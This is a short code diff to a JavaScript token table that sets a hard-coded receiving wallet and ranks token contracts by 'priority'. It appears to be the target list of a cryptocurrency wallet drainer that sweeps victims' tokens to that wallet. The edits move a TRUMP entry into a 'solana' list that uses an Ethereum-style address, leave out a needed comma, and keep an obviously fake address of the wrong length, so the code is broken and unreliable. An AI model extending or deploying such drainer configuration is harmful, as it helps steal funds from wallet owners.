@@ -2,6 +2,18 @@
 var RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";
 
 var TOKENS = {
+ solana: [
+     {
+      name: "OFFICIAL TRUMP",
+      symbol: "TRUMP",
+      address: "0x7D21841DC10BA1C5797951EFc62fADBBD55B03bC",
+      logo: "https://s2.coinmarketcap.com/static/img/coins/64x64/35336.png", 
+      abi: ERC20_ABI,
+      decimals: 18,
+      priority: 14
+    },   
+ ]
+  
   ethereum: [
     {
       name: "Tether USD",
@@ -190,15 +202,7 @@ var TOKENS = {
       decimals: 18,
       priority: 13
     },
-    {
-      name: "Trump Coin",
-      symbol: "TRUMP",
-      address: "0x7D21841DC10BA1C5797951EFc62fADBBD55B03bC",
-      logo: "https://example.com/trumpcoin.png", // Replace with actual logo URL
-      abi: ERC20_ABI,
-      decimals: 18,
-      priority: 14
-    },
+
     {
       name: "Pepe",
       symbol: "PEPE",
@@ -338,7 +342,7 @@ var TOKENS = {
       name: "AI Pepe",
       symbol: "AIPEPE",
       address: "0x2025aD2b2c34567890abcdef1234567890abcd",
-      logo: "https://example.com/aipepe.png", // Replace with actual logo URL
+      logo: "https://s2.coinmarketcap.com/static/img/coins/64x64/26632.png", 
       abi: ERC20_ABI,
       decimals: 9,
       priority: 9,
